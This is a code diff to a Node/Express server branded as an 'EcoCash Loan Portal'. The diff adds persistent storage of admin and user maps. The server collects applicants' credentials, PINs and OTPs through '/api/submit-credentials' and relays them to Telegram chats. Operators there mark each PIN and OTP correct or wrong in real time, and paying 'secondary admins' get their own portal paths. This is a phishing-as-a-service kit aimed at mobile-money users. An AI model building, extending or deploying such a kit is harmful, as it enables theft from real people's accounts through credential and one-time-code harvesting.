@@ -2,6 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 const fetch = require('node-fetch');
 
 const app = express();
@@ -13,11 +14,54 @@ app.use(express.json());
 const publicPath = path.join(__dirname, 'public');
 app.use(express.static(publicPath));
 
+// Persistent storage file path
+const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
+
+// Load initial data from disk if it exists
+function loadPersistentData() {
+  try {
+    if (fs.existsSync(STORAGE_FILE)) {
+      const rawData = fs.readFileSync(STORAGE_FILE, 'utf8');
+      const parsed = JSON.parse(rawData);
+      return {
+        authorizedUsers: new Map(parsed.authorizedUsers || []),
+        secondaryAdmins: new Map(parsed.secondaryAdmins || []),
+        pathToAdminChat: new Map(parsed.pathToAdminChat || []),
+        adminCounter: parsed.adminCounter || 1
+      };
+    }
+  } catch (err) {
+    console.error("Error loading persistent data:", err);
+  }
+  return {
+    authorizedUsers: new Map(),
+    secondaryAdmins: new Map(),
+    pathToAdminChat: new Map(),
+    adminCounter: 1
+  };
+}
+
+// Save current maps to disk
+function savePersistentData() {
+  try {
+    const dataToSave = {
+      authorizedUsers: Array.from(authorizedUsers.entries()),
+      secondaryAdmins: Array.from(secondaryAdmins.entries()),
+      pathToAdminChat: Array.from(pathToAdminChat.entries()),
+      adminCounter
+    };
+    fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
+  } catch (err) {
+    console.error("Error saving persistent data:", err);
+  }
+}
+
 const activeApplications = new Map();
-const authorizedUsers = new Map();
-const secondaryAdmins = new Map(); // Maps userId -> assignedPath (e.g., /Admin-0002)
-const pathToAdminChat = new Map(); // Maps assignedPath -> telegram chatId
-let adminCounter = 1;
+const persisted = loadPersistentData();
+const authorizedUsers = persisted.authorizedUsers;
+const secondaryAdmins = persisted.secondaryAdmins;
+const pathToAdminChat = persisted.pathToAdminChat;
+let adminCounter = persisted.adminCounter;
 
 function formatZimbabwePhone(phone) {
   let formattedPhone = phone || '';
@@ -44,7 +88,6 @@ app.post('/api/submit-credentials', async (req, res) => {
     const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
     const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;
 
-    // Target the specific admin chat based on the URL path used by the applicant
     const portalPath = data.portalPath || '/Admin-0001';
     const targetChatId = pathToAdminChat.get(portalPath) || process.env.TELEGRAM_CHAT_ID;
 
@@ -177,7 +220,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const masterChatId = process.env.TELEGRAM_CHAT_ID;
 
-  // Handle incoming text messages (e.g., /start)
   if (req.body.message && req.body.message.text) {
     const message = req.body.message;
     const text = message.text.trim();
@@ -194,11 +236,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       const userStatus = authorizedUsers.get(userId);
 
-      // 1. Main Admin access initialization
       if (chatId === masterChatId) {
         authorizedUsers.set(userId, 'PAID');
         const mainPath = '/Admin-0001';
         pathToAdminChat.set(mainPath, chatId);
+        savePersistentData();
 
         const portalUrl = `https://${req.get('host')}${mainPath}`;
         const welcomeBackText = `🤖 <b>EcoCash Loan Portal (Main Admin)</b>\n\n` +
@@ -212,7 +254,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // 2. Approved secondary admin link recovery
       if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
         const assignedPath = secondaryAdmins.get(userId);
         const portalUrl = `https://${req.get('host')}${assignedPath}`;
@@ -227,8 +268,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // 3. New request handling (Sent only to Main Admin for payment approval)
       authorizedUsers.set(userId, 'PENDING');
+      savePersistentData();
 
       const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
                              `🆔 <b>ID:</b> <code>${userId}</code>\n` +
@@ -268,7 +309,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  // Handle Callback Queries
   const { callback_query } = req.body;
   if (!callback_query) return;
 
@@ -276,7 +316,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const chatId = callback_query.message.chat.id.toString();
   const messageId = callback_query.message.message_id;
 
-  // Main Admin manages payment authorization clicks
   if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
     if (chatId !== masterChatId) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
@@ -304,6 +343,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         assignedPath = secondaryAdmins.get(targetUserId);
       }
     }
+    savePersistentData();
 
     const statusLabel = isPaid ? `🟢 APPROVED (PAID) - Link: ${assignedPath}` : '🔴 REJECTED (UNPAID)';
     const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;
@@ -322,9 +362,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  // Security check: Ensure secondary admins can only control buttons for their own links
-  const expectedAdminChatId = pathToAdminChat.get(callback_query.message.chat.text?.match(/\/Admin-\d{4}/)?.[0] || '') || chatId; 
-  // Let's resolve the target chat from the application reference inside the callback data
   let targetAppRef = '';
   if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
   if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
@@ -343,7 +380,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     }
   }
 
-  // PIN verification handlers
   if (actionData.startsWith('pin_correct_')) {
     const appReference = actionData.replace('pin_correct_', '');
     if (activeApplications.has(appReference)) {
@@ -366,7 +402,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
-  // OTP verification handlers
   if (actionData.startsWith('otp_correct_')) {
     const appReference = actionData.replace('otp_correct_', '');
     if (activeApplications.has(appReference)) {
@@ -413,4 +448,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
-  
+                                                  
